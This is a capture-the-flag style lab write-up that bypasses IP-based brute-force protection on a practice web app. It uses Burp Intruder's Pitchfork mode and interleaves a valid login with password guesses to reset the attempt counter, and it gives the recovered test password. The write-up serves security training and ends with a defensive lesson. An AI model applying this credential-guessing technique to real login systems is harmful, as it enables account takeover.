# Lab 4 — Broken brute-force protection, IP block

> [← Back to Authentication](../README.md)

---

## 🎯 Objective
Bypass IP-based brute-force protection by resetting the attempt counter with a valid login every 2 attempts.

---

## 🪜 Steps

### Step 1 — Capture the login request
Intercept a `POST /login` request in Burp → send to **Intruder**.

---

### Step 2 — Set attack type to Pitchfork
- Attack type: **Pitchfork**
- Payload positions: `username=§user§&password=§pass§`

---

### Step 3 — Configure Resource Pool
Go to **Resource Pool** in Burp.
Set: **Maximum concurrent requests = 1**

This ensures requests are sent in order — critical for the counter reset to work.

---

### Step 4 — Build Username payload list
Interleave your valid account with the target account. Every other request resets the counter:

```
wiener
carlos
wiener
carlos
wiener
carlos
... (repeat for all passwords)
```

---

### Step 5 — Build Password payload list
Pair wiener's real password with each password to try for carlos:

```
peter        ← resets counter
123456       ← try for carlos
peter
password
peter
12345678
peter
qwerty
peter
abc123
peter
letmein
peter
football
...
```

---

### Step 6 — Start the attack
Requests go in this order:
```
1. wiener:peter      → 302 (valid — resets counter)
2. carlos:123456     → test
3. wiener:peter      → 302 (resets counter)
4. carlos:password   → test
...
```

---

### Step 7 — Identify successful login
After the attack completes, sort by **Status** column.

Look for: **Status code = 302** on a carlos request.

**Found password: `12345678`**

---

### Step 8 — Login as Carlos
Credentials:
- Username: `carlos`
- Password: `12345678`

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
IP-based rate limiting can be bypassed by resetting the counter with valid logins in between attempts. True brute-force protection requires per-account lockout combined with CAPTCHA.
